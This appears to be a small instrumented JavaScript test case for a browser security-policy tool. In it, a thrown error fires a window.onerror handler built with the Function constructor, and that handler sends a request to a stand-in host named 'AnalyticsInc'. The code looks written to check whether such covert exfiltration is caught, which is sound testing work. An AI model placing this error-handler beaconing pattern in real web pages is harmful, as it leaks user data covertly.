
JAM.startProfile('load');
function exfiltrate_key_history(){JAMScript.call(window.NotExistingFunction,window,[])}var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error1", true);xmlhttp.send(null);',v0=window,v2=JAMScript.call(Function,null,[exp]);JAMScript.set(v0,"onerror",v2);var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
